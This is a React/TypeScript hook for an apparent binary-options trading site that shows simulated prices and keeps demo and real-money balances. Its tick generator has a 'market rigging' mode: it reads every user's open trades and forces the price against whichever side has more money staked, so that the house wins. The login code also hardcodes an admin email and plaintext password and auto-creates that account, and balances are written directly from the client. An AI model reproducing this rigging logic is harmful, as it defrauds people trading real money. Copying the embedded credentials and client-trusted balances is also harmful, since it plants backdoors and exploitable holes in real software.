import { useState, useEffect, useCallback, useRef } from 'react';
import { Asset, AccountType, Trade, TradeAction, PricePoint } from '../types';
import { ASSET_DETAILS } from '../components/AssetLogo';
import { soundManager } from '../lib/sound';
import { sendWelcomeEmail } from '../lib/emailService';
import { auth, db, googleProvider } from '../lib/firebase';
import { onAuthStateChanged, User as FirebaseUser, signInWithPopup, signOut, signInWithEmailAndPassword, createUserWithEmailAndPassword } from 'firebase/auth';
import { doc, getDoc, setDoc, onSnapshot, collection, query, where, orderBy, limit, addDoc, updateDoc, Timestamp, writeBatch } from 'firebase/firestore';

const INITIAL_DEMO_BALANCE = 10000;
const INITIAL_REAL_BALANCE = 0;

const ASSET_BASE_PRICES: Record<Asset, number> = {
  // Forex
  'EUR/USD': 1.0850,
  'GBP/USD': 1.2720,
  'USD/JPY': 155.40,
  'USD/INR': 83.45,

  // Crypto
  'Bitcoin': 64000,
  'Ethereum': 3400,
  'Solana': 145,

  // Commodities
  'Gold': 2350,
  'Silver': 28.50,
  'Crude Oil': 78.20,

  // Stocks & Tech Giants
  'Apple': 189.20,
  'Microsoft': 420.80,
  'Google': 175.40,
  'Amazon': 180.50,
  'Meta': 490.20,
  'Netflix': 630.10,
  'Nvidia': 120.40,
  'Tesla': 178.50,

  // Global Brands
  'Coca-Cola': 68.20,
  'PepsiCo': 172.50,
  'Visa': 270.80,
  'Mastercard': 450.60,
};

const ASSET_VOLATILITY: Record<Asset, number> = {
  // Forex
  'EUR/USD': 0.0004,
  'GBP/USD': 0.0005,
  'USD/JPY': 0.04,
  'USD/INR': 0.02,

  // Crypto
  'Bitcoin': 45,
  'Ethereum': 4,
  'Solana': 0.25,

  // Commodities
  'Gold': 1.5,
  'Silver': 0.05,
  'Crude Oil': 0.12,

  // Stocks & Tech Giants
  'Apple': 0.25,
  'Microsoft': 0.50,
  'Google': 0.30,
  'Amazon': 0.35,
  'Meta': 0.85,
  'Netflix': 0.90,
  'Nvidia': 0.40,
  'Tesla': 0.45,

  // Global Brands
  'Coca-Cola': 0.10,
  'PepsiCo': 0.20,
  'Visa': 0.35,
  'Mastercard': 0.60,
};

// Maximum historical points kept in memory (2 hours = 7200 points = 1440 candles deep history)
const MAX_HISTORY_POINTS = 7200;
const SIM_GENESIS = 1704067200000; // Jan 1, 2024

const ALL_ASSETS: Asset[] = [
  'EUR/USD', 'GBP/USD', 'USD/JPY', 'USD/INR',
  'Bitcoin', 'Ethereum', 'Solana',
  'Gold', 'Silver', 'Crude Oil',
  'Apple', 'Microsoft', 'Google', 'Amazon', 'Meta', 'Netflix', 'Nvidia', 'Tesla',
  'Coca-Cola', 'PepsiCo', 'Visa', 'Mastercard'
];

// Seeded PRNG for deterministic market simulation
const mulberry32 = (a: number) => {
  return () => {
    let t = a += 0x6D2B79F5;
    t = Math.imul(t ^ t >>> 15, t | 1);
    t ^= t + Math.imul(t ^ t >>> 7, t | 61);
    return ((t ^ t >>> 14) >>> 0) / 4294967296;
  };
};

const getAssetSeed = (asset: string) => {
  let hash = 0;
  for (let i = 0; i < asset.length; i++) {
    hash = ((hash << 5) - hash) + asset.charCodeAt(i);
    hash |= 0;
  }
  return hash;
};

// Fast, robust, and deterministic history generation anchored directly around base price
function getAssetHistoryRange(asset: Asset, endTimeMs: number, pointsCount: number): PricePoint[] {
  const points: PricePoint[] = new Array(pointsCount);
  const basePrice = ASSET_BASE_PRICES[asset] || 100;
  const volatility = ASSET_VOLATILITY[asset] || 0.1;
  const decimals = ASSET_DETAILS[asset]?.decimals ?? 2;
  const assetSeed = getAssetSeed(asset);

  const startTimeMs = endTimeMs - (pointsCount - 1) * 1000;
  const minuteIndex = Math.floor(startTimeMs / 60000);
  const rng = mulberry32((assetSeed + minuteIndex) % 4294967296);

  // Start within 1% of base price
  let currentPrice = basePrice * (1 + (rng() - 0.5) * 0.015);
  const minPrice = basePrice * 0.2;
  const maxPrice = basePrice * 2.5;

  for (let k = 0; k < pointsCount; k++) {
    const time = startTimeMs + k * 1000;
    // Mean-reverting pull towards basePrice prevents extreme drift
    const pull = (basePrice - currentPrice) * 0.0003;
    const noise = (rng() - 0.499) * volatility;
    currentPrice = currentPrice + noise + pull;
    
    // Safety clamp to realistic bounds
    if (currentPrice < minPrice) currentPrice = minPrice + Math.abs(noise);
    if (currentPrice > maxPrice) currentPrice = maxPrice - Math.abs(noise);

    points[k] = {
      time,
      price: Number(currentPrice.toFixed(decimals))
    };
  }

  return points;
}

// Generate next tick price from last price smoothly
function generateNextTickPrice(
  asset: Asset, 
  lastPrice: number, 
  seedModifier: number,
  forceMode: 'NORMAL' | 'FORCE_UP' | 'FORCE_DOWN' | 'AUTO_HOUSE_WIN' = 'NORMAL',
  activeTradesSummary?: { callSum: number; putSum: number }
): number {
  const basePrice = ASSET_BASE_PRICES[asset] || 100;
  const volatility = ASSET_VOLATILITY[asset] || 0.1;
  const decimals = ASSET_DETAILS[asset]?.decimals ?? 2;
  const assetSeed = getAssetSeed(asset);
  
  // Use addition instead of XOR to prevent 32-bit truncation correlation on large timestamps
  const rng = mulberry32((assetSeed + seedModifier) % 4294967296);
  let pull = (basePrice - lastPrice) * 0.002;
  let noise = (rng() - 0.498) * volatility;

  let effectiveMode = forceMode;
  if (effectiveMode === 'AUTO_HOUSE_WIN' && activeTradesSummary) {
    if (activeTradesSummary.callSum > activeTradesSummary.putSum) {
      // More user money on Green / CALL (e.g. $100 vs $50) -> Force DOWN (Red) so house wins
      effectiveMode = 'FORCE_DOWN';
    } else if (activeTradesSummary.putSum > activeTradesSummary.callSum) {
      // More user money on Red / PUT -> Force UP (Green) so house wins
      effectiveMode = 'FORCE_UP';
    } else if (activeTradesSummary.callSum > 0 && activeTradesSummary.callSum === activeTradesSummary.putSum) {
      // Equal money -> Normal random behavior
      effectiveMode = 'NORMAL';
    }
  }

  if (effectiveMode === 'FORCE_UP' || effectiveMode === 'FORCE_DOWN') {
    // Nullify pull completely so natural mean-reversion doesn't block the forced trend
    pull = 0;
    
    // "Candle छोड़-छोड़ कर बनाए" (Alternating & organic candlestick movement)
    // Add assetSeed so all assets don't move in perfect sync
    const candleCycle = Math.floor((seedModifier + assetSeed) / 5000) % 4;

    
    let isTargetDirection = true;
    if (candleCycle === 1) {
      isTargetDirection = rng() < 0.20; // Lowered chance of counter movement
    } else {
      isTargetDirection = rng() < 0.85; // Increased chance of correct direction
    }

    const directionMultiplier = effectiveMode === 'FORCE_UP' ? 1 : -1;

    if (isTargetDirection) {
      // Much stronger noise when pushing the price in the desired kill direction
      noise = directionMultiplier * volatility * (0.25 + rng() * 0.45);
    } else {
      // Very small opposite movement for realistic organic ticks
      noise = -directionMultiplier * volatility * (0.05 + rng() * 0.10);
    }
  }

  let nextPrice = lastPrice + noise + pull;

  const minPrice = basePrice * 0.2;
  const maxPrice = basePrice * 2.5;
  if (nextPrice < minPrice) nextPrice = minPrice + Math.abs(noise);
  if (nextPrice > maxPrice) nextPrice = maxPrice - Math.abs(noise);

  return Number(nextPrice.toFixed(decimals));
}

export function useTrading() {
  const [user, setUser] = useState<FirebaseUser | null>(null);
  const [accountType, setAccountType] = useState<AccountType>('Demo Account');
  const [demoBalance, setDemoBalance] = useState<number>(INITIAL_DEMO_BALANCE);
  const [realBalance, setRealBalance] = useState<number>(INITIAL_REAL_BALANCE);
  const [activeAsset, setActiveAsset] = useState<Asset>('EUR/USD');
  const [trades, setTrades] = useState<Trade[]>([]);
  const [lastCompletedTrade, setLastCompletedTrade] = useState<Trade | null>(null);

  // Initialize Auth
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      setUser(currentUser);
    });
    return () => unsubscribe();
  }, []);

  const loginWithGoogle = async () => {
    try {
      // In strict partitioned iframe environments, sessionStorage might be blocked/cleared.
      // Explicitly set persistence to local storage before opening popup to mitigate state loss.
      const { setPersistence, browserLocalPersistence, signInWithPopup, getAdditionalUserInfo } = await import('firebase/auth');
      await setPersistence(auth, browserLocalPersistence);
      const userCred = await signInWithPopup(auth, googleProvider);
      
      // Send Welcome/Login Email immediately
      if (userCred.user && userCred.user.email) {
        const emailToUse = userCred.user.email.toLowerCase();
        const nameToUse = userCred.user.displayName || emailToUse.split('@')[0] || 'Trader';
        console.log(`[Auth] Google Sign-In Success. Triggering welcome email for ${emailToUse}`);
        // We do not await this to ensure it fires without blocking
        sendWelcomeEmail(nameToUse, emailToUse).catch(err => console.error("Email trigger failed:", err));
      }
    } catch (error: any) {
      console.error("Google Sign-In Error:", error);
      throw error;
    }
  };

  const loginWithEmail = async (email: string, pass: string) => {
    try {
      const userCred = await signInWithEmailAndPassword(auth, email, pass);
      // Send Welcome/Login Email
      if (userCred.user && userCred.user.email) {
        const emailToUse = userCred.user.email.toLowerCase();
        const nameToUse = userCred.user.displayName || emailToUse.split('@')[0] || 'Trader';
        sendWelcomeEmail(nameToUse, emailToUse);
      }
    } catch (error: any) {
      // If it's the master admin and they haven't registered yet, register them
      if (email === 'rajsjarma8@gmail.com' && pass === 'Raja90' && error.code === 'auth/user-not-found') {
        try {
          const userCred = await createUserWithEmailAndPassword(auth, email, pass);
          if (userCred.user && userCred.user.email) {
            sendWelcomeEmail('Admin', userCred.user.email);
          }
        } catch (regError) {
          console.error("Admin Auto-Registration Error:", regError);
        }
      } else {
        console.error("Email Login Error:", error);
        throw error;
      }
    }
  };

  const logout = async () => {
    try {
      await signOut(auth);
    } catch (error) {
      console.error("Logout Error:", error);
    }
  };

  // Sync User Data (Balances & Profile)
  useEffect(() => {
    if (!user) return;

    const userDocRef = doc(db, 'users', user.uid);
    
    // Initial fetch and real-time listener
    const unsubscribe = onSnapshot(userDocRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        setDemoBalance(data.demoBalance ?? INITIAL_DEMO_BALANCE);
        setRealBalance(data.realBalance ?? INITIAL_REAL_BALANCE);
        if (data.activeAsset) setActiveAsset(data.activeAsset);

        // Auto-sync email and name if missing or outdated in Firestore
        const emailToSave = user.email ? user.email.toLowerCase() : '';
        const nameToSave = user.displayName || data.name || (emailToSave ? emailToSave.split('@')[0] : 'User');
        if (emailToSave && (!data.email || data.email !== emailToSave || !data.displayName)) {
          setDoc(userDocRef, {
            email: emailToSave,
            displayName: nameToSave,
            name: nameToSave,
            updatedAt: Timestamp.now()
          }, { merge: true }).catch(console.warn);
        }
      } else {
        // Initialize user document if it doesn't exist
        const emailToSave = user.email ? user.email.toLowerCase() : '';
        const nameToSave = user.displayName || (emailToSave ? emailToSave.split('@')[0] : 'User');
        setDoc(userDocRef, {
          email: emailToSave,
          displayName: nameToSave,
          name: nameToSave,
          demoBalance: INITIAL_DEMO_BALANCE,
          realBalance: INITIAL_REAL_BALANCE,
          activeAsset: 'EUR/USD',
          updatedAt: Timestamp.now()
        });
      }
    }, (err) => {
      console.warn("User doc listener error:", err);
    });

    return () => unsubscribe();
  }, [user]);

  // Sync Trades History
  useEffect(() => {
    if (!user) return;

    const tradesQuery = query(
      collection(db, 'trades'),
      where('userId', '==', user.uid),
      orderBy('createdAt', 'desc'),
      limit(100)
    );

    const unsubscribe = onSnapshot(tradesQuery, (querySnapshot) => {
      const tradesData: Trade[] = [];
      querySnapshot.forEach((doc) => {
        const data = doc.data();
        tradesData.push({
          id: doc.id,
          asset: data.asset,
          action: data.action,
          entryPrice: data.entryPrice,
          amount: data.amount,
          createdAt: data.createdAt?.toMillis() || Date.now(),
          expiryTime: data.expiryTime?.toMillis() || Date.now(),
          status: data.status,
          resultPrice: data.resultPrice,
          profit: data.profit
        });
      });
      setTrades(tradesData);
    }, (err) => {
      console.warn("Trades listener error:", err);
    });

    return () => unsubscribe();
  }, [user]);

  // Market Rigging & Candle Control State
  const [marketControl, setMarketControl] = useState<{
    globalMode: 'NORMAL' | 'FORCE_UP' | 'FORCE_DOWN' | 'AUTO_HOUSE_WIN';
    assetModes: Record<string, 'NORMAL' | 'FORCE_UP' | 'FORCE_DOWN' | 'AUTO_HOUSE_WIN'>;
  }>({
    globalMode: 'NORMAL',
    assetModes: {}
  });
  const marketControlRef = useRef(marketControl);
  marketControlRef.current = marketControl;

  useEffect(() => {
    const unsub = onSnapshot(doc(db, 'market_control', 'config'), (snap) => {
      if (snap.exists()) {
        const data = snap.data() as any;
        setMarketControl(data);
        marketControlRef.current = data;
      }
    }, (err) => {
      console.warn("Market control listener error:", err);
    });
    return () => unsub();
  }, []);

  // Global Active Trades listener across ALL users for real-time house win calculations
  const [allActiveTradesList, setAllActiveTradesList] = useState<{ asset: string; action: 'CALL' | 'PUT'; amount: number }[]>([]);
  const activeTradesListRef = useRef(allActiveTradesList);
  activeTradesListRef.current = allActiveTradesList;

  useEffect(() => {
    const q = query(collection(db, 'trades'), where('status', '==', 'ACTIVE'));
    const unsub = onSnapshot(q, (snap) => {
      const activeList: { asset: string; action: 'CALL' | 'PUT'; amount: number }[] = [];
      snap.forEach(d => {
        const data = d.data();
        activeList.push({
          asset: data.asset,
          action: data.action,
          amount: Number(data.amount) || 0
        });
      });
      setAllActiveTradesList(activeList);
      activeTradesListRef.current = activeList;
    }, (err) => {
      console.warn("Active trades listener error:", err);
    });
    return () => unsub();
  }, []);

  const lastTickRef = useRef<number>(Date.now());
  const allHistoriesRef = useRef<Record<Asset, PricePoint[]>>((() => {
    const now = Date.now();
    const initialHistories: Record<Asset, PricePoint[]> = {} as any;
    ALL_ASSETS.forEach(asset => {
      initialHistories[asset] = getAssetHistoryRange(asset, now, MAX_HISTORY_POINTS); // 4 hours deep history
    });
    return initialHistories;
  })());

  const historyRef = useRef<PricePoint[]>(allHistoriesRef.current[activeAsset] || []);
  const priceRef = useRef<number>(
    historyRef.current.length > 0
      ? historyRef.current[historyRef.current.length - 1].price
      : ASSET_BASE_PRICES[activeAsset]
  );

  // Initialize data pools and price synchronization
  useEffect(() => {
    const now = Date.now();
    if (!allHistoriesRef.current || Object.keys(allHistoriesRef.current).length === 0) {
      const initialHistories: Record<Asset, PricePoint[]> = {} as any;
      ALL_ASSETS.forEach(asset => {
        initialHistories[asset] = getAssetHistoryRange(asset, now, MAX_HISTORY_POINTS);
      });
      allHistoriesRef.current = initialHistories;
    }
    lastTickRef.current = now;
    
    if (allHistoriesRef.current[activeAsset]) {
      historyRef.current = allHistoriesRef.current[activeAsset];
      priceRef.current = historyRef.current[historyRef.current.length - 1].price;
      setCurrentPrice(priceRef.current);
    }
  }, []); // Only on mount

  // Synchronous asset switcher to prevent chart race conditions
  const changeActiveAsset = useCallback((newAsset: Asset) => {
    setActiveAsset(newAsset);
    if (allHistoriesRef.current[newAsset] && allHistoriesRef.current[newAsset].length > 0) {
      historyRef.current = allHistoriesRef.current[newAsset];
      priceRef.current = historyRef.current[historyRef.current.length - 1].price;
      setCurrentPrice(priceRef.current);
    } else {
      const now = Date.now();
      const generated = getAssetHistoryRange(newAsset, now, MAX_HISTORY_POINTS);
      allHistoriesRef.current[newAsset] = generated;
      historyRef.current = generated;
      priceRef.current = generated[generated.length - 1].price;
      setCurrentPrice(priceRef.current);
    }
  }, []);

  // Update refs when active asset changes
  useEffect(() => {
    if (allHistoriesRef.current[activeAsset]) {
      historyRef.current = allHistoriesRef.current[activeAsset];
      priceRef.current = historyRef.current[historyRef.current.length - 1].price;
      setCurrentPrice(priceRef.current);
    }
  }, [activeAsset]);

  const [currentPrice, setCurrentPrice] = useState<number>(priceRef.current);

  // Sync Active Asset Choice
  useEffect(() => {
    if (user) {
      setDoc(doc(db, 'users', user.uid), { activeAsset, updatedAt: Timestamp.now() }, { merge: true });
    }
  }, [activeAsset, user]);

  // High-frequency price generation with deterministic continuity
  useEffect(() => {
    let animId: number;

    const loop = () => {
      const now = Date.now();
      const secondsElapsed = Math.floor((now - lastTickRef.current) / 1000);

      if (secondsElapsed > 0) {
        if (secondsElapsed > 10) {
          // Tab was sleeping or app reopened after a pause - fast resync to real-time clock
          ALL_ASSETS.forEach(asset => {
            allHistoriesRef.current[asset] = getAssetHistoryRange(asset, now, MAX_HISTORY_POINTS);
          });
          if (allHistoriesRef.current[activeAsset]) {
            historyRef.current = allHistoriesRef.current[activeAsset];
            priceRef.current = historyRef.current[historyRef.current.length - 1].price;
          }
          lastTickRef.current = now;
        } else {
          // Normal 1-second ticks
          ALL_ASSETS.forEach(asset => {
            const currentArr = allHistoriesRef.current[asset] || [];
            
            // Determine active market mode for this asset
            const assetMode = marketControlRef.current?.assetModes?.[asset] || marketControlRef.current?.globalMode || 'NORMAL';
            
            // Active trade sums for this asset
            const assetTrades = activeTradesListRef.current.filter(t => t.asset === asset);
            const callSum = assetTrades.filter(t => t.action === 'CALL').reduce((sum, t) => sum + t.amount, 0);
            const putSum = assetTrades.filter(t => t.action === 'PUT').reduce((sum, t) => sum + t.amount, 0);

            for (let i = 1; i <= secondsElapsed; i++) {
              const tickTime = lastTickRef.current + i * 1000;
              const lastPrice = currentArr.length > 0 ? currentArr[currentArr.length - 1].price : (ASSET_BASE_PRICES[asset] || 100);
              const newPrice = generateNextTickPrice(asset, lastPrice, tickTime, assetMode, { callSum, putSum });

              currentArr.push({ time: tickTime, price: newPrice });
            }
            
            const prunedArr = currentArr.length > MAX_HISTORY_POINTS 
              ? currentArr.slice(currentArr.length - MAX_HISTORY_POINTS) 
              : currentArr;

            allHistoriesRef.current[asset] = prunedArr;
            if (asset === activeAsset) {
              priceRef.current = prunedArr[prunedArr.length - 1].price;
              historyRef.current = prunedArr;
            }
          });

          lastTickRef.current += secondsElapsed * 1000;
        }
      }
      
      animId = requestAnimationFrame(loop);
    };

    animId = requestAnimationFrame(loop);

    return () => {
      cancelAnimationFrame(animId);
    };
  }, [activeAsset]);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentPrice(priceRef.current);
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Trade Evaluator
  useEffect(() => {
    const checkTrades = setInterval(async () => {
      if (!user) return;
      const now = Date.now();
      
      const activeTrades = trades.filter(t => t.status === 'ACTIVE' && now >= t.expiryTime);
      if (activeTrades.length === 0) return;

      const batch = writeBatch(db);
      const userRef = doc(db, 'users', user.uid);
      let demoDiff = 0;
      let realDiff = 0;

      for (const trade of activeTrades) {
        const assetHistory = allHistoriesRef.current[trade.asset] || [];
        const closestPoint = assetHistory.find(p => p.time >= trade.expiryTime) || assetHistory[assetHistory.length - 1];
        const finalPrice = closestPoint ? closestPoint.price : priceRef.current;

        let status: 'WIN' | 'LOSS' | 'TIE' = 'TIE';
        let profit = 0;
        const payoutRate = ASSET_DETAILS[trade.asset]?.payout ?? 82;
        
        if (trade.action === 'CALL') {
          if (finalPrice > trade.entryPrice) status = 'WIN';
          else if (finalPrice < trade.entryPrice) status = 'LOSS';
        } else {
          if (finalPrice < trade.entryPrice) status = 'WIN';
          else if (finalPrice > trade.entryPrice) status = 'LOSS';
        }
        
        if (status === 'WIN') {
          profit = trade.amount * (payoutRate / 100);
          if (accountType === 'Demo Account') demoDiff += (trade.amount + profit);
          else realDiff += (trade.amount + profit);
          soundManager.playWin();
        } else if (status === 'LOSS') {
          soundManager.playLoss();
        }

        const tradeRef = doc(db, 'trades', trade.id);
        batch.update(tradeRef, {
          status,
          resultPrice: finalPrice,
          profit,
          updatedAt: Timestamp.now()
        });
        
        // Non-blocking set for local banner
        setLastCompletedTrade({ ...trade, status, resultPrice: finalPrice, profit });
      }

      if (demoDiff !== 0 || realDiff !== 0) {
        batch.set(userRef, {
          demoBalance: demoBalance + demoDiff,
          realBalance: realBalance + realDiff,
          updatedAt: Timestamp.now()
        }, { merge: true });
      }

      await batch.commit();
      
    }, 1000);

    return () => clearInterval(checkTrades);
  }, [user, trades, demoBalance, realBalance, accountType]);

  const placeTrade = useCallback(async (amount: number, expirySeconds: number, action: TradeAction) => {
    if (!user) return false;
    const currentBalance = accountType === 'Demo Account' ? demoBalance : realBalance;
    
    if (amount > currentBalance || amount <= 0) return false;

    const tradeId = Math.random().toString(36).substring(7);
    const createdAt = Date.now();
    const expiryTime = createdAt + expirySeconds * 1000;

    const batch = writeBatch(db);
    const userRef = doc(db, 'users', user.uid);
    const tradeRef = doc(collection(db, 'trades'), tradeId);

    if (accountType === 'Demo Account') {
      batch.set(userRef, { demoBalance: demoBalance - amount, updatedAt: Timestamp.now() }, { merge: true });
    } else {
      batch.set(userRef, { realBalance: realBalance - amount, updatedAt: Timestamp.now() }, { merge: true });
    }

    batch.set(tradeRef, {
      userId: user.uid,
      asset: activeAsset,
      action,
      entryPrice: priceRef.current,
      amount,
      createdAt: Timestamp.fromMillis(createdAt),
      expiryTime: Timestamp.fromMillis(expiryTime),
      status: 'ACTIVE',
      updatedAt: Timestamp.now()
    });

    await batch.commit();
    soundManager.playTradeExecuted();
    return true;
  }, [user, accountType, demoBalance, realBalance, activeAsset]);

  const resetDemoBalance = useCallback(async () => {
    if (!user) return;
    await setDoc(doc(db, 'users', user.uid), {
      demoBalance: INITIAL_DEMO_BALANCE,
      updatedAt: Timestamp.now()
    }, { merge: true });
  }, [user]);

  const clearLastTrade = useCallback(() => {
    setLastCompletedTrade(null);
  }, []);

  return {
    accountType,
    setAccountType,
    balance: accountType === 'Demo Account' ? demoBalance : realBalance,
    demoBalance,
    realBalance,
    activeAsset,
    setActiveAsset: changeActiveAsset,
    historyRef,
    currentPrice,
    trades,
    placeTrade,
    lastCompletedTrade,
    clearLastTrade,
    resetDemoBalance,
    user,
    loginWithGoogle,
    loginWithEmail,
    logout
  };
}

